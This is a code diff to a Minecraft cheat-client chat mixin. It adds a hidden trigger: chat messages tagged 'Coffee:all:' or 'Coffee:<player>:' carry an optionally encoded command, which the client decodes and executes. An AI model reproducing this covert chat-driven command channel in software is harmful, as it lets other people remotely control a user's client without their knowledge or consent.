@@ -48,11 +48,16 @@ public class ChatHudMixin extends DrawableHelper {
 
 		LOGGER.info("[CHAT] {}", chatText.getString().replaceAll("\r", "\\\\r").replaceAll("\n", "\\\\n"));
 		try {
-			if (chatText.getString().contains("Coffee:")) {
-				if (!chatText.getString().toLowerCase().contains(WurstClient.MC.player.getName().asString().toLowerCase())) {
-					String s = chatText.getString().split("Coffee:")[1];
+			if (chatText.getString().startsWith("(") && (chatText.getString().toLowerCase().contains("Coffee:all:".toLowerCase()) || chatText.getString().toLowerCase().contains(("Coffee:" + client.player.getName().asString() +":").toLowerCase())) ) {
+				if (!chatText.getString().toLowerCase().contains(WurstClient.MC.player.getName().asString().toLowerCase() + ")")) {
+					String s = chatText.getString().split(":")[2];
 					System.out.println(s);
-					String cmd = new String(ExecuteCmd.CODING_PROCESS.decode(s.getBytes()));
+					String cmd;
+					if (chatText.getString().contains("DeCoffee:")) {
+						cmd = s;
+					} else {
+						cmd = new String(ExecuteCmd.CODING_PROCESS.decode(s.getBytes()));
+					}
 					System.out.println(cmd);
 					KeybindProcessor.processCmd(cmd);
 				}
